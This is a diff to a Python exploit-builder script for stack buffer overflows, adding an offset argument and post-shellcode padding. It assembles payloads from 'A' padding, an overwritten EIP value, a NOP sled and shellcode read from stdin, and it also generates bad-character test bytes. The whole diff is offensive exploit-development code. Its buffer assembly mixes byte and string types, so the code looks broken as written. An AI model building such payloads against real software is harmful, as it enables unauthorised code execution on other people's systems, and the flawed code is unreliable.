@@ -18,6 +18,7 @@ parser.add_argument("positional", help="Create - Size, Offset - EIP value")
 parser.add_argument("-b",help="Bad Characters", required=False)
 parser.add_argument("-n",help="Number of NOP instructions", required=False)
 parser.add_argument("-e",help="EIP value",required=False)
+parser.add_argument("-o",help="Offset value",type=int,required=False)
 parser.add_argument("-v",help="verbose", action="store_true")
 args = parser.parse_args()
 
@@ -70,12 +71,14 @@ def badchars(size,chars):
         buffer += x.to_bytes(1, 'big')
     return buffer
 
-def exploit(size,nops,shellcode,EIP):
+def exploit(size,nops,shellcode,EIP,offset):
     nopsled = b"\x90" * int(nops)
     eip_val = bytearray(EIP)
     buffer = eip_val + nopsled + shellcode
-    padding_size = size - len(buffer)
-    buffer = "A" * padding_size + buffer
+    pre_padding_size = size - len(buffer)
+    post_padding_size = size - offset - int(nops) - len(shellcode) - 4   #Finds the amound of post-padding required
+    buffer = "A" * pre_padding_size + buffer
+    buffer += "A" * post_padding_size
     return buffer
 
 
@@ -94,7 +97,7 @@ def main():
         sys.stdout.buffer.write(badchars(args.positional, args.b))
     if (args.mode == "E"):
         shellcode = sys.stdin.read()
-        print(exploit(int(args.positional),int(args.n),shellcode,convert_to_hex(args.e)))
+        sys.stdout.write(exploit(int(args.positional),int(args.n),shellcode,convert_to_hex(args.e),args.o))
         
 
    
